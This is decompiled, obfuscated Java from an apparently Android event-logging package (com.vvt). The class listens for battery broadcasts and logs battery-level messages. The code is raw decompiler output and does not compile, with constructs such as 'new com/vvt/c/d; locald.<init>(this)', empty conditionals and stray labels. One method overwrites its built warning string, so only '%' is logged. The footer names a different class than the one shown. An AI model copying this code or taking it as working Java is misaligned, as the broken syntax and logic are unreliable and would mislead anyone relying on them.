package com.vvt.c;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import com.vvt.base.RunningMode;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxSystemEvent;
import com.vvt.events.FxSystemEventCategories;
import java.util.ArrayList;
import java.util.List;

public class c
{
  private static final boolean a;
  private static volatile int b;
  private com.vvt.base.a c;
  private RunningMode d;
  private boolean e;
  private BroadcastReceiver f;
  
  static
  {
    boolean bool = a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      return;
    }
  }
  
  public c()
  {
    d locald = new com/vvt/c/d;
    locald.<init>(this);
    this.f = locald;
  }
  
  private void a(String paramString)
  {
    boolean bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = new com/vvt/events/FxSystemEvent;
    ((FxSystemEvent)localObject1).<init>();
    Object localObject2 = FxEventDirection.OUT;
    ((FxSystemEvent)localObject1).setDirection((FxEventDirection)localObject2);
    long l = System.currentTimeMillis();
    ((FxSystemEvent)localObject1).setEventTime(l);
    localObject2 = FxSystemEventCategories.CATEGORY_BATTERY_INFO;
    ((FxSystemEvent)localObject1).setLogType((FxSystemEventCategories)localObject2);
    ((FxSystemEvent)localObject1).setMessage(paramString);
    localArrayList.add(localObject1);
    localObject1 = this.c;
    ((com.vvt.base.a)localObject1).a(localArrayList);
    bool = a;
    if (bool) {}
  }
  
  private final void c(Intent paramIntent)
  {
    String str1 = "level";
    int i = paramIntent.getIntExtra(str1, 0);
    String str2 = "scale";
    int j = 100;
    int k = paramIntent.getIntExtra(str2, j);
    b = i * 100 / k;
    boolean bool = a;
    if (bool) {}
  }
  
  public void a()
  {
    boolean bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
  }
  
  public void a(Context paramContext)
  {
    boolean bool = a;
    if (bool) {}
    Object localObject1 = this.d;
    Object localObject2 = RunningMode.FULL;
    if (localObject1 != localObject2)
    {
      localObject1 = new android/content/IntentFilter;
      ((IntentFilter)localObject1).<init>();
      ((IntentFilter)localObject1).addAction("android.intent.action.BATTERY_OKAY");
      ((IntentFilter)localObject1).addAction("android.intent.action.BATTERY_CHANGED");
      ((IntentFilter)localObject1).addAction("android.intent.action.BATTERY_LOW");
      localObject2 = this.f;
      paramContext.registerReceiver((BroadcastReceiver)localObject2, (IntentFilter)localObject1);
      bool = true;
      this.e = bool;
    }
    bool = a;
    if (bool) {}
  }
  
  protected void a(Intent paramIntent)
  {
    boolean bool = a;
    if (bool) {}
    String str = "Battery level is good now.";
    a(str);
    bool = a;
    if (bool) {}
  }
  
  public void a(RunningMode paramRunningMode)
  {
    this.d = paramRunningMode;
  }
  
  public void a(com.vvt.base.a parama)
  {
    this.c = parama;
  }
  
  public int b()
  {
    boolean bool = a;
    if (bool) {}
    Object localObject = this.d;
    RunningMode localRunningMode = RunningMode.FULL;
    if (localObject == localRunningMode)
    {
      localObject = b.a();
      if (localObject != null) {
        break label58;
      }
      bool = false;
      localObject = null;
    }
    label58:
    int i;
    for (b = 0;; b = i)
    {
      bool = a;
      if (bool) {}
      bool = a;
      if (bool) {}
      return b;
      i = ((Integer)localObject).intValue();
    }
  }
  
  public void b(Context paramContext)
  {
    boolean bool = a;
    if (bool) {}
    Object localObject = this.d;
    RunningMode localRunningMode = RunningMode.FULL;
    if (localObject != localRunningMode)
    {
      localObject = this.f;
      if (localObject != null)
      {
        bool = this.e;
        if (bool)
        {
          localObject = this.f;
          paramContext.unregisterReceiver((BroadcastReceiver)localObject);
          bool = false;
          localObject = null;
          this.e = false;
        }
      }
    }
    bool = a;
    if (bool) {}
  }
  
  protected void b(Intent paramIntent)
  {
    boolean bool = a;
    if (bool) {}
    Object localObject = new java/lang/StringBuilder;
    ((StringBuilder)localObject).<init>();
    localObject = ((StringBuilder)localObject).append("Battery level has dropped below ");
    int i = b;
    localObject = ((StringBuilder)localObject).append(i);
    String str = "%";
    localObject = str;
    a((String)localObject);
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */